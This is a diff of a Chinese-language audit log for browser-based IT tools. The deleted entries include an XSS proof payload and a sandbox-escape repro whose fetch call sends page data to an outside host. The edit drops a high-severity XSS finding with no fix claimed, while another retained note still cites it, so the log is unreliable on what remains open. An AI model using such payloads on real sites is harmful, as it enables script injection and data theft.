@@ -343,19 +343,9 @@
 ### 覆盖清单（V 批 IT 生成/校验/计算）
 - `sqlite-cheatsheet`：无高优/中优缺陷（命令语法、`.mode`/JSON1/窗口函数示例与版本注记抽查正确；Chart/Table 双视图与检索联动正常）。
 - `standard-deviation`：IT-N433（中）；无高优缺陷（sample/population 公式与 32/7≈4.57、s≈2.138 复算一致）。
-- `css-minify`：IT-N431（高）。
 - 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数实算（`minify`、`parseData/calculate`、`PROPERTIES` 去重）并给出「输入 → 实际 / 期望」；**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N430 的引号未转义依据 HTML 文本节点序列化规则判定（`& < >` 转义、引号不转义），未做真机粘贴验证；两处 `</div`（缺 `>`，`meta-tags-generator.html:124`、`css-minify.html:127`）会吞掉紧随的 `<div class="toolbar">` 开标签，属结构/布局问题，未计入本批条目。
 
 ## V 批 · IT 编辑器/安全/编码（2026-11-04）
-
-### IT-N437 源码应用与 HTML 导入直接写 `innerHTML`，事件属性在页面源执行（高，安全缺陷）
-- 页面：`tools/it/rich-text-editor.html`
-- 问题：`applySource()` 把源码框原文直接赋给 contenteditable 的 `innerHTML`（`:424`）；`loadFile()` 把导入文件内容同样直接赋值（`:548`）。两条路径都没有标签/属性白名单，`<img src=x onerror=…>` 之类的内联事件会在本页源执行。页内说明却写着「粘贴内容必须净化，输出 HTML 前必须过滤，否则极易引入 XSS」（`:124`）、FAQ「通常做净化防止 XSS」（`:249`）、标准表「输出净化」（`:273`），实际一处净化都没有（全文无 sanitize/DOMPurify 实现）。另外 `showResult` 把导入文件名直接拼进 `innerHTML`（`:550`）。
-- 行号：`:424`、`:548`、`:550`（说明 `:124`、`:249`、`:273`）
-- 复现：源码框粘贴 `<img src="x" onerror="alert(document.domain)">` → 点「✓ 应用到编辑区」→ 实际弹窗显示当前域名（图片加载失败即触发）；期望 `onerror` 被剥除或作为纯文本插入。导入文件名为 `<img src=x onerror=…>.html` 时，`:550` 同样执行。
-- 影响：任何下载来的 HTML 模板/他人给的 `.html` 文件，导入后即可在本站源执行任意脚本，读写本站 localStorage、改写页面；用户把该工具当"本地编辑"用，不会预期导入即执行脚本。
-- 方案：赋值前用 DOMPurify（或白名单清洗）过滤 `script/iframe/on*`；文件名用 `textContent` 拼接。
-- 假工具：否
 
 ### IT-N448 高亮按行独立 tokenize，跨行块注释/三引号字符串/HTML 注释无法识别（中，确认缺陷）
 - 页面：`tools/it/code-highlighter.html`
@@ -364,33 +354,6 @@
 - 复现：JS 输入三行 `/* a` / ` b` / `*/` → 实际第 1 行注释色、第 2 行 `b` 普通色、第 3 行 `*/` 运算符色；期望三行整体注释色。Python 多行 docstring、HTML 多行注释同症状；模板字符串跨行也会被拆成多色。
 - 影响：文档注释、多行字符串是最常见输入，高亮结果错色并被"复制高亮 HTML"原样带出。
 - 方案：整段 tokenize 后再按 token 内部换行拆行渲染，或携带跨行状态。
-- 假工具：否
-
-### IT-N449 「复制高亮 HTML」不带 `.hl-*` 样式，粘贴到页面外全无颜色（中，确认缺陷）
-- 页面：`tools/it/code-highlighter.html`
-- 问题：`copyHighlightedHTML()` 只拼容器与 `td` 的内联样式（`:1447-1451`），没有导出 `.hl-keyword/.hl-string/.hl-comment…` 的颜色规则（这些规则只存在于本页 `<style>` 的 `:166-196`），复制结果里的 `<span class="hl-…">` 在目标文档中无任何样式。
-- 行号：`:1433-1455`（核心 `:1447-1451`）、`:166-196`
-- 复现：输入 `const a = 1;` → 点「🎨 高亮渲染」→「📋 复制高亮 HTML」→ 把剪贴板内容存成 `.html` 打开 → 实际只有黑色等宽文本与行号，关键字/字符串/注释全无颜色；期望保留着色。
-- 影响：该按钮的唯一用途就是带走带色片段，产物在页面外不可用（结构、行号、字体正常，仅颜色全部丢失）。
-- 方案：复制时把 `.hl-*` 规则（含浅/深主题色）内联成 `<style>` 前缀，或为每个 span 写行内 `style="color:…"`。
-- 假工具：否
-
-### IT-N451 `sandbox` 同时开 `allow-scripts` 与 `allow-same-origin`，隔离失效且可外发数据（高，安全缺陷）
-- 页面：`tools/it/code-runner.html`
-- 问题：iframe 声明 `sandbox="allow-scripts allow-modals allow-same-origin"`（`:494`）。按 HTML 规范，`allow-scripts` + `allow-same-origin` 会让框架保留父页同源身份、脚本可访问父文档，沙箱形同虚设（浏览器会给出"可逃逸沙箱"告警）；父子页也确实依赖同源才能 `contentDocument` + `doc.write`（`:717-761`）。页面却称「交给隔离 iframe 执行」（`:401`）、「防止访问主页面 DOM、Cookie 与同源数据」（`:405`），FAQ 称「不能访问网络/文件，沙箱隔离，仅纯计算」（`:604`）。
-- 行号：`:494`（承诺 `:401`、`:405`、`:601`、`:604`、`:623-629`）
-- 复现：JS 面板输入 `parent.document.body.dataset.pwned='1'; parent.localStorage.setItem('tb','x'); fetch('https://example.com/x?d='+encodeURIComponent(parent.location.href))` 后运行 → 实际父页 DOM 被改、localStorage 被写、跨域请求已出站（受 CORS 影响但请求已发出）；期望 `parent.document` 抛 `SecurityError`、无网络请求。
-- 影响：任何被粘贴或分享的代码片段都能读写本站 localStorage 并外发，或改写工具页 UI；"浏览器沙箱隔离"的安全承诺不成立（当前能力等同"同页预览器"）。
-- 方案：去掉 `allow-same-origin`，改用 `srcdoc`/Blob URL 注入且父页不再直接访问 `contentDocument`（控制台仍经 postMessage），并声明"非安全沙箱"直至改完。
-- 假工具：否
-
-### IT-N452 用户 JS 里的字面量 `</script>` 提前闭合内联脚本，整段代码失效（中，确认缺陷）
-- 页面：`tools/it/code-runner.html`
-- 问题：`doc.write(... '<script>' + js + '<\/script>' ...)`（`:759`）把用户 JS 原样嵌入内联脚本，出现字面量 `</script>` 即提前结束脚本块，后续内容被当作 HTML。
-- 行号：`:759`
-- 复现：JS 输入 `console.log("</script>")` 后点运行 → 实际生成 `<script>console.log("` 被截断，控制台报语法错误、剩余代码变成页面文本；期望正常打印 `</script>`。
-- 影响：演示 `document.write('<script src=x></script>')` 这类 HTML 字符串是常见需求，一写整段失效，且报错指向用户代码、掩盖真实原因。
-- 方案：拼接前把 `js` 中的 `</script` 替换为 `<\/script`（或用 `srcdoc` 并转义）。
 - 假工具：否
 
 ### IT-N453 用户代码无超时/终止机制，`while(true)` 直接冻结整个标签页（中，承诺未实现）
@@ -411,20 +374,10 @@
 - 方案：改用 Worker 计时与停止，或把忙等切成 `setTimeout` 分片让出主线程。
 - 假工具：否
 
-### IT-N455 「复制测试代码」只给出空循环，忽略所选负载与时长，无法复现页面结果（中，假功能）
-- 页面：`tools/it/benchmark-builder.html`
-- 问题：`copyCode()` 生成的是写死模板（`:315-318`）：注释里只有类型名，循环体只有 `// 在此放入被测代码` + `ops++`，时长固定 `1000`ms，完全不读取 `#type` 的负载逻辑与 `#ms` 的时长。
-- 行号：`:315-318`
-- 复现：选「数组操作」+「5 秒」→ 点「复制测试代码」→ 实际得到 `while(performance.now()-start<1000){ // 在此放入被测代码\n ops++; }`，只测空循环开销，与所选负载无关；期望复制包含 `push`/`sort` 的对应负载并写入 5000ms。
-- 影响：这是该页唯一可带走的产物，拿到的代码测不出页面上的负载，对比结果无意义。
-- 方案：按 `type` 生成对应 workload 片段，并把 `ms` 注入循环条件。
-- 假工具：否
-
 ### 覆盖清单（V 批 IT 编辑器/安全/编码）
-- `rich-text-editor`：IT-N437（高，安全待修）
-- `code-highlighter`：IT-N448、IT-N449（中）；无高优缺陷（token 渲染统一走 `esc()`，`<`/`>`/`&`/`"` 已转义，未发现注入）。
-- `code-runner`：IT-N451（高，安全）；IT-N452、IT-N453（中）。
-- `benchmark-builder`：IT-N454、IT-N455（中）；无高优缺陷（五种负载的循环体与吞吐公式本身可算，评级阈值仅为经验值）。
+- `code-highlighter`：IT-N448（中，跨行高亮待修）；无高优缺陷（token 渲染统一走 `esc()`，`<`/`>`/`&`/`"` 已转义，未发现注入）。
+- `code-runner`：IT-N453（中，执行超时待修）；N451/N452 已由 srcdoc + 去 allow-same-origin + `<\/script` 转义修复。
+- `benchmark-builder`：IT-N454（中，忙等无法停止待修）；无高优缺陷（五种负载的循环体与吞吐公式本身可算，评级阈值仅为经验值）。
 - 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数实算（`calcTool` 行数统计、`enc/dec`、`prettyHtml`、emoji 数组去重、`split('')` 反转）并给出「输入 → 实际 / 期望」；**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N437 的事件属性执行、IT-N451 的沙箱逃逸依据 HTML 规范（`innerHTML` 插入的 `onerror` 会触发；`allow-scripts` + `allow-same-origin` 不提供来源隔离）判定，未做真机复现。
 
 ## W 批 · IT URL/签名/安全（2026-11-04）
